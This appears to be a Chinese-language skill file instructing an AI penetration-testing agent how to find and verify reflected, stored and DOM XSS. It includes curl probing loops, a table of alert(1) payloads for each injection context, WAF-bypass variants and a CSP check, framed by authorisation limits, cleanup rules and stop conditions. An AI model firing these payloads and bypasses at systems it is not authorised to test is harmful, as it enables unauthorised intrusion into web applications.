---
name: xss-reflected
description: 检测和验证反射型、存储型和 DOM 型跨站脚本（XSS）漏洞，包括 CSP 绕过和客户端框架注入。
category: web
source: xalgorix
tags:
  - XSS
  - 注入
  - CSP 绕过
  - OWASP Top 10
required_tools:
  - curl
  - 浏览器开发者工具
---

# XSS 跨站脚本检测

## 适用场景

- 目标 Web 应用存在用户输入点（搜索框、表单、URL 参数、HTTP 头）。
- 需要验证输入是否被正确编码或过滤。
- 测试 CSP（内容安全策略）是否可被绕过。

## 授权边界

- 仅使用无害 payload（`alert()` / `console.log()` / `document.write()`），不窃取 cookie 或执行恶意脚本。
- 存储型 XSS 测试时，测试完成后必须清理注入的数据。
- 如果 payload 被反射到管理后台或其他用户可见区域，立即报告主代理。

## 前置条件

- 已提取目标应用的 URL、参数和表单（来自 inventory）。
- 已知目标是否使用了特定前端框架（React、Vue、Angular）。
- 浏览器环境用于 DOM 型 XSS 验证。

## 执行步骤

### 步骤 1：输入点映射

列出所有可能存在反射的参数和位置：

```bash
# 从 URL 参数集合中提取每个参数
cat inventory.md | grep -oP '\b\w+=' | tr -d '=' | sort -u > params.txt
```

### 步骤 2：反射检测

对每个参数注入探测字符串并观察响应：

```bash
# 探测 payload
PROBE='xsstest"><xsstest'
for param in $(cat params.txt); do
  curl -s "https://<target>/page?$param=$PROBE" | grep -c 'xsstest'
done
```

如果响应中包含未编码的 `"><xsstest`，标记该参数为潜在注入点。

### 步骤 3：上下文分类

根据注入位置选择 payload 类型：

| 上下文 | 示例 payload |
| --- | --- |
| HTML 标签体 | `<img src=x onerror=alert(1)>` |
| HTML 属性值 | `" onfocus=alert(1) autofocus "` |
| JavaScript 字符串 | `';alert(1);//` |
| URL 属性 | `javascript:alert(1)` |
| CSS 上下文 | `</style><img src=x onerror=alert(1)>` |

### 步骤 4：常见 WAF 绕过

如果基础 payload 被过滤，尝试以下绕过：

```bash
# 大小写混合
curl -s "https://<target>/page?q=<ScRiPt>alert(1)</sCrIpT>"

# 标签内空格变体
curl -s "https://<target>/page?q=<img%0dsrc=x%0donerror=alert(1)>"

# HTML 实体编码
curl -s "https://<target>/page?q=&lt;img src=x onerror=alert(1)&gt;"
```

### 步骤 5：DOM 型 XSS 检测

在浏览器开发者工具中检查 source → sink 流程：

```javascript
// 常见 sink 函数
// document.write(), innerHTML, eval(), setTimeout(), location.href
// 在控制台中跟踪用户输入是否能到达这些 sink
```

### 步骤 6：CSP 绕过测试

如果 CSP 阻止内联脚本，尝试：

```bash
# 检查 CSP 是否允许特定 CDN
curl -sI https://<target>/ | grep -i 'content-security-policy'

# 如果允许 unsafe-eval 或特定域名，尝试通过允许的源加载 payload
```

## 停止条件

- Payload 被反射到管理后台或其他用户可见区域时立即停止，报告主代理。
- 目标部署了强 WAF 且所有绕过尝试失败时，记录尝试的 payload 列表后停止。
- 发现可能需要 DOM 操作或用户交互才能触发的 XSS 时，先报告再深入。

## 输出格式

- 存在反射的参数列表和对应的有效 payload。
- 过滤/WAF 观察（哪些 payload 被拦截，哪些通过）。
- DOM 型 XSS 的 source → sink 路径。
- CSP 分析结果（是否有已知绕过方法）。
- 建议：是否需要手工验证或转交 confirmed finding。

## 验收标准

1. 至少对所有 URL 参数和表单字段进行了一次反射探测。
2. 至少测试了 3 种上下文（HTML 体、属性、JS 字符串）。
3. 尝试了至少 3 种 WAF 绕过方法。
4. 发现的注入点已记录到 finding 模板（如确认可利用）。
